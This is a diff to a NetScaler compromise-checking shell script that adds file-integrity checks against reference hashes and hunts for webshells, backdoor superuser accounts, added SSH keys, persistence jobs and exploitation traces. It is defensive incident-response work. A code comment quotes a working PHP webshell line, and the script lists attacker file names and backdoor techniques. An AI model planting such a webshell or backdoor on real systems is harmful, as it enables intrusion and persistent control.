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
+1st2nemh5P8D6ADw61j/AAA=
+'
+      GRES=$(printf '%s\n' "$GUIB64" | perl -MMIME::Base64 -e 'local $/; print decode_base64(<STDIN>)' 2>/dev/null | gzip -dc 2>/dev/null | perl -MDigest::SHA -e '
+        my %ref; while (<STDIN>) { chomp; my ($h, $p) = split / /, $_, 2; $ref{$p} = $h if defined $p }
+        exit 3 unless keys(%ref) > 600;
+        my $root = "/var/netscaler/gui"; my @todo = map { "$root/$_" } qw(admin_ui vpn vpns epa);
+        while (defined(my $d = shift @todo)) {
+          opendir(my $dh, $d) or next;
+          for my $e (readdir $dh) {
+            next if $e eq "." || $e eq ".."; my $f = "$d/$e"; next if -l $f;
+            if (-d $f) { push @todo, $f; next }
+            next unless -f $f && $e =~ /\.(php|phtml|pl|cgi|sh|html?|js|py)$/i;
+            my $r = substr($f, length($root) + 1);
+            if (!exists $ref{$r}) { print "EXTRA $f\n"; next }
+            my $h = eval { Digest::SHA->new(256)->addfile($f)->hexdigest } // "";
+            print "CHANGED $f\n" if substr($h, 0, 16) ne $ref{$r};
+          }
+          closedir $dh;
+        }
+        print "#CHECKED " . scalar(keys %ref) . "\n";' 2>/dev/null)
+      if [ -z "$GRES" ]; then
+        warn "Web GUI integrity check could not run (reference list or Perl module unreadable) - compare /var/netscaler/gui with a clean 14.1-73.46 by hand"
+      fi
+    fi
+    fsd() { while read -r x; do [ -n "$x" ] && echo "$x ($(wc -c < "$x" 2>/dev/null | tr -d ' ') bytes, $(fmtdate "$(mtime "$x")"))"; done; }
+    F=$(printf '%s\n' "$GRES" | sed -n 's/^EXTRA //p' | grep -iE '\.(php|phtml|pl|cgi|sh|py)$')
+    [ -n "$F" ] && { warn "Extra script files in the web GUI that a clean 14.1-73.46 does not have - check each one, a php2shell or CVE-2026-88771 attacker leaves webshells here:"; echo "$F" | fsd | show 10; FOLLOWUP=1; }
+    F=$(printf '%s\n' "$GRES" | sed -n 's/^EXTRA //p' | grep -viE '\.(php|phtml|pl|cgi|sh|py)$')
+    [ -n "$F" ] && { warn "Extra .html/.js files in the web GUI that a clean 14.1-73.46 does not have (your own customisation, or dropped by an attacker):"; echo "$F" | fsd | show 8; FOLLOWUP=1; }
+    F=$(printf '%s\n' "$GRES" | sed -n 's/^CHANGED //p')
+    [ -n "$F" ] && { warn "Web GUI files that differ from the clean 14.1-73.46 reference - compare with a clean appliance of the same build, a changed PHP file can be a webshell:"; echo "$F" | fsd | show 10; FOLLOWUP=1; }
+    [ -n "$INTN" ] && { warn "System files that differ from the clean $RBLD reference - compare with a clean appliance of the same build before treating them as tampered:"; echo "$INTN" | grep -v '^$' | show 5; FOLLOWUP=1; }
+    _ck=$(printf '%s\n' "$GRES" | sed -n 's/^#CHECKED //p')
+    if [ -n "$_ck" ] && ! printf '%s\n' "$GRES" | grep -qE '^(EXTRA|CHANGED) '; then
+      okay "Web GUI scripts match the clean 14.1-73.46 reference ($_ck files; reference from Deyda's triage script)"
+    fi
+    [ -n "$INTOK" ] && okay "Match the clean $RBLD reference:$INTOK"
+    if [ -z "$SHX$CSX" ]; then
+      printf '  %s[INFO]%s     %s\n' "$B" "$N" "No clean file reference for ${RBLD}$( [ "$ISFIPS" -eq 1 ] && echo ' FIPS/NDcPP') - file integrity not compared (references: 14.1-73.37/73.41/73.46, 13.1-64.24; web GUI: 14.1-73.46)"
+    fi
     # v1.14 (PR #4, feiglein74): any PHP file in the logon / VPN web folders, at any depth and age. The logon pages are static; a .php
     # there is a webshell. Field case (Citrix IoC scan, HIGH): LogonPoint/uiareas/linux/gnuplot.php from the
     # CVE-2023-3519 wave, still on the box in 2026 ("http_response_code(404); @$_POST['branch']($_POST['struct']);").
@@ -1646,7 +2165,7 @@ setuid/setgid program outside the system folders: $(for x in $F; do ls -l "$x" 2
     # DOWNLOADED with 200: the command ran and its output, e.g. the config, left the box. Harvesting scanners
     # ("ArtifactChecker/1.0", 5 Oct) fetch these names on many boxes - with 404 that is only a probe.
     DROPN=$( { printf '%s\n%s\n' "$INJ" "$HINJ" | perl -ne 's/\$\{?IFS\}?|\{IFS\}|%20/ /g; while (/(?:>\s*|\s-q?o\s+|czf\s+)(\/(?:var\/netscaler\/logon|netscaler\/ns_gui|var\/vpn)\/[^\s;|&#<>"\x27]+)/g) { print "$1\n" }' | sed 's#.*/##'
-               printf '%s\n' insight-new.js xua.html c88771.json id009.txt rce.txt; } | grep -v '^$' | sort -u | sed 's/[.]/[.]/g' | tr '\n' '|' | sed 's/|$//')
+               printf '%s\n' insight-new.js xua.html c88771.json id009.txt rce.txt pwn.txt ns_ctx.html ns0e82mz.txt; } | grep -v '^$' | sort -u | sed 's/[.]/[.]/g' | tr '\n' '|' | sed 's/|$//')
     if [ -n "$DROPN" ]; then
       F=$(zgrep -ahE "/(${DROPN})[ ?\"].*\" 200 " /var/log/httpaccess* 2>/dev/null | fixtag "$FIXREF" | head -5)
       [ -n "$F" ] && COMP="$COMP
@@ -1662,6 +2181,9 @@ httpd alias: $F"
     F=$( { find /var/vpn /var/ns /netscaler/ns_gui /var/netscaler \( -name 'nx_verify.html' -o -iname 'nx_*.html' \) 2>/dev/null
            ls -d /var/tmp/wtw* /var/tmp/watchTowr* /var/tmp/boom* 2>/dev/null
            find /netscaler/ns_gui /var/netscaler -maxdepth 3 -name 'id009*' 2>/dev/null
+           # watchTowr IoC list (9 Oct): execution markers and recon output in temp and web folders
+           ls -d /var/tmp/cve88771* /tmp/sessions.log.d /var/netscaler/logon/LogonPoint/ns_ctx.html 2>/dev/null
+           find /var/vpn /var/netscaler/logon /var/netscaler/gui /netscaler/ns_gui -maxdepth 4 -type f \( -name 'pwn.txt' -o -name 'p.txt' -o -name 'ns0e82mz*' \) 2>/dev/null
            find /var/tmp /tmp /var/vpn /var/netscaler/logon /netscaler/ns_gui/vpn -maxdepth 3 -type f -size -2k -mtime -30 2>/dev/null \
              | notours | xargs grep -lE '^uid=[0-9]+\([a-z_]+\) gid=' 2>/dev/null
          } | sort -u)
@@ -1734,6 +2256,11 @@ legacy CVE-2019-19781 backdoor / exploit files (NOTROBIN, 2020 - an older, separ
     F=$(grep -nHE '(add|bind) system user "?sec_monitor' /nsconfig/ns.conf /flash/nsconfig/ns.conf 2>/dev/null | sort -u | cut -c1-200)
     [ -n "$F" ] && COMP="$COMP
 backdoor superuser account sec_monitor in ns.conf (LevelBlue):
+$F"
+    # watchTowr IoC list (9 Oct): the Perl stager removes and re-adds gw_health and binds it to superuser
+    F=$(grep -nHE '(add|bind) system user "?gw_health' /nsconfig/ns.conf /flash/nsconfig/ns.conf 2>/dev/null | sort -u | cut -c1-200)
+    [ -n "$F" ] && COMP="$COMP
+backdoor superuser account gw_health in ns.conf (watchTowr):
 $F"
     F=$( { find /var/netscaler/logon /netscaler/ns_gui /var/vpn -name '.local_journal*' 2>/dev/null; ls -d /tmp/update_result_*.tgz /var/tmp/update_result_*.tgz 2>/dev/null; } | sort -u)
     [ -n "$F" ] && COMP="$COMP
@@ -1931,7 +2458,7 @@ $F"
     EARGS=""; for ip in $(echo "$OPP_IPRE" | tr '|' ' ' | tr -d '\\'); do EARGS="$EARGS -e $ip"; done
     F=$(catlogs /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* 2>/dev/null | grep -aF $EARGS | grep -aE "(^|[^0-9.])($OPP_IPRE)([^0-9]|$)" | grep -avE 'shell_command=|CMD_EXECUTED.* - Command "(add|bind|set|unset|rm|unbind|show|save|enable|disable|apply|batch|stat|sync|clear|update|create|restore|import|export|switch|link|unlink) ' | fixtag "$FIXREF")
     if [ -n "$F" ]; then
-      addtgt "opportunistic scanner IPs tagged by GreyNoise (hunting lead only - often residential/proxy, do not block on this alone)" "$F" 3
+      addtgt "opportunistic scanner and mass-exploitation source IPs (GreyNoise, Zscaler; hunting lead only - often residential/proxy, do not block on this alone)" "$F" 3
       TGT="$TGT
   IPs seen: $(echo "$F" | grep -oE "(^|[^0-9.])($OPP_IPRE)([^0-9]|$)" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq -c | sort -rn | head -6 | awk '{printf "%s x%s  ", $2, $1}')"
     fi
@@ -2421,6 +2948,28 @@ $u - not in $LASTW (saved $(fmtdate "$(mtime "$LASTW")")), so added after that"
       note "Lupovis saw such a probe on 17 Sep, before CVE-2026-88779 was public. Not proof of exploitation - compare with the nsaaad crash lines above."
       FOLLOWUP=1
     fi
+    # v1.17 php2shell hunting leads (no public IoCs yet - the checker's own idea, never red): POSTs to the management PHP
+    # entry points (/login /menu /nitro /rapi /api, Remko Weijnen) from public addresses, and PHP out-of-memory errors or
+    # Apache child crashes in the error log (the exploit drives PHP out of memory with a crafted multipart POST).
+    # Exploitation attempts were first seen on 17 Oct (Amazon), so only lines from 17 Oct on are shown.
+    P17=$(perl -MTime::Local -e 'print timelocal(0,0,0,17,9,2026)' 2>/dev/null)
+    F=$(catlogs /var/log/httpaccess* 2>/dev/null | grep -aE '"POST /(login|menu|nitro|rapi|api)[/? ]' \
+        | grep -avE '^(10\.|192\.168\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.)' | fixtag "$P17" | grep -a '^\[after fix\]' | sed 's/^\[after fix\] //')
+    if [ -n "$F" ]; then
+      warn "POST requests to the management GUI/API from public addresses since 17 Oct ($(echo "$F" | grep -c .) line(s); php2shell hunting lead):"
+      echo "$F" | cut -c1-200 | binsafe | show 5
+      note "Sources: $(echo "$F" | awk '{print $1}' | sort | uniq -c | sort -rn | head -5 | awk '{printf "%s x%s  ", $2, $1}')"
+      note "Expected only from your admin hosts or NetScaler Console. Anything else: restrict management access now (php2shell lines above)."
+      FOLLOWUP=1
+    fi
+    F=$(catlogs /var/log/httperror* 2>/dev/null | grep -aE 'Allowed memory size of [0-9]+ bytes exhausted|exit signal (Segmentation fault|Bus error|Abort trap|Illegal instruction)' \
+        | fixtag "$P17" | grep -a '^\[after fix\]' | sed 's/^\[after fix\] //')
+    if [ -n "$F" ]; then
+      warn "PHP out-of-memory errors or Apache child crashes in the error log since 17 Oct ($(echo "$F" | grep -c .) line(s); php2shell hunting lead - the exploit drives PHP out of memory):"
+      echo "$F" | cut -c1-200 | binsafe | show 5
+      note "A one-off error can be normal (for example a large firmware upload in the GUI). Compare the times with the POST requests above."
+      FOLLOWUP=1
+    fi
     if [ "$SAMLWA" -gt 0 ] && [ "${RESPON:-0}" -eq 0 ]; then
       warn "SAML mitigation policy bound ($SAMLWAN), but the Responder feature is NOT enabled in ns.conf - the policy is ignored"
       note "Enable it: enable ns feature RESPONDER ; save ns config   (check with: show ns feature | grep -i responder)"
@@ -2498,6 +3047,45 @@ $u - not in $LASTW (saved $(fmtdate "$(mtime "$LASTW")")), so added after that"
     F=$(for t in /var/cron/tabs/*; do [ -f "$t" ] || continue; case "${t##*/}" in root|nobody) continue ;; esac
           n=$(grep -cvE '^[[:space:]]*(#|$)' "$t" 2>/dev/null); [ "${n:-0}" -gt 0 ] && echo "${t##*/} ($n job(s), changed $(fmtdate "$(mtime "$t")")): $(grep -vE '^[[:space:]]*(#|$)' "$t" | head -2 | tr '\n' ' ' | cut -c1-140)"; done)
     [ -n "$F" ] && { warn "Crontabs for users other than root - check each job is expected:"; echo "$F" | show 8; FOLLOWUP=1; }
+    # --- more OS persistence: SSH keys, at jobs, uid-0 accounts, jobs that restore files in the web folders,
+    #     processes started from temp/web folders. Dated against 2026-09-20 (earliest known actor recon) so that
+    #     long-standing admin entries do not raise a CHECK on every run.
+    HUNT0=1789862400
+    # SSH keys: an added key survives patch and reboot. /root/.ssh may be rebuilt from /nsconfig at boot.
+    KEYF=$(find /root/.ssh /nsconfig/ssh /flash/nsconfig/ssh /nsconfig/.ssh /home/*/.ssh -maxdepth 1 -type f -name 'authorized_keys*' 2>/dev/null)
+    if [ -n "$KEYF" ]; then
+      KNEW=""; KLIST=""
+      for f in $KEYF; do
+        m=$(mtime "$f"); n=$(grep -cE '^[[:space:]]*(ssh-|ecdsa-|sk-)' "$f" 2>/dev/null)
+        KLIST="$KLIST
+$f ($n key(s), changed $(fmtdate "$m")):
+$(grep -E '^[[:space:]]*(ssh-|ecdsa-|sk-)' "$f" 2>/dev/null | awk '{k=$2; print "  " $1 " ..." substr(k, length(k)-11) "  " ($3 != "" ? $3 : "(no comment)")}' | head -5)"
+        ATB=0; [ -n "$BOOT" ] && [ -n "$m" ] && [ "$m" -ge "$((BOOT - 60))" ] && [ "$m" -le "$((BOOT + 900))" ] && ATB=1
+        [ -n "$m" ] && [ "$m" -ge "$HUNT0" ] && [ "$ATB" -eq 0 ] && KNEW="$KNEW $f"
+      done
+      # v1.17 (PR #7): yellow, not red - admins add keys legitimately; a known attacker key is red above (PR #8)
+      if [ -n "$KNEW" ]; then warn "SSH authorized_keys changed since 2026-09-20 (not at boot) - check every key is yours, an added key survives patch and reboot:$KNEW"
+      else okay "SSH authorized_keys unchanged since before 2026-09-20 (or only rewritten at boot):"; fi
+      echo "$KLIST" | grep -v '^$' | show 12
+      [ -n "$KNEW" ] && FOLLOWUP=1
+    else
+      okay "No SSH authorized_keys files"
+    fi
+    # at jobs and extra uid-0 accounts
+    F=$(find /var/at/jobs -type f ! -name '.*' 2>/dev/null | head -5)
+    [ -n "$F" ] && { susp "at jobs (one-off scheduled commands) - check what they run: $(echo $F)"; FOLLOWUP=1; }
+    F=$(awk -F: '$3==0 && $1!="root" && $1!="toor" && $1!="nsroot" {print $1}' /etc/passwd 2>/dev/null | tr '\n' ' ')
+    [ -n "$F" ] && { susp "Accounts with uid 0 in /etc/passwd besides root/toor/nsroot: $F"; FOLLOWUP=1; }
+    # cron / boot-script lines that write into the logon / VPN web folders or touch a .php file: a job that restores a
+    # webshell after a cleanup (field case: a webshell rewritten on the hour long after its first drop)
+    F=$( { for t in /var/cron/tabs/* /nsconfig/crontab /nsconfig/rc.netscaler /nsconfig/nsafter.sh /nsconfig/nsbefore.sh /flash/nsconfig/rc.netscaler; do
+             [ -f "$t" ] && grep -vE '^[[:space:]]*(#|$)' "$t" 2>/dev/null | grep -E '/var/netscaler/logon/|/var/vpn/|\.php([[:space:];|&>]|$)' | sed "s#^#${t}: #"; done; } | cut -c1-200 | head -8)
+    [ -n "$F" ] && { susp "Cron / boot-script lines that write into the logon/VPN web folders or touch a .php file - can restore a webshell:"; echo "$F" | show 8; FOLLOWUP=1; }
+    # processes started from temp or web folders (any language); this checker may itself run from /tmp or /var/tmp
+    F=$(ps -axww -o pid= -o ppid= -o user= -o command= 2>/dev/null \
+      | awk -v me="$$" -v self="$0" '$1!=me && $2!=me && index($0, self)==0 && $0 !~ /ctx697096/' \
+      | grep -E '(^|[[:space:]=])/(tmp|var/tmp|var/vpn|var/netscaler/logon|netscaler/ns_gui)/' | cut -c1-200 | head -5)
+    [ -n "$F" ] && { warn "Processes started from /tmp, /var/tmp or web folders (pid ppid user command) - check each one:"; echo "$F" | show 5; FOLLOWUP=1; }
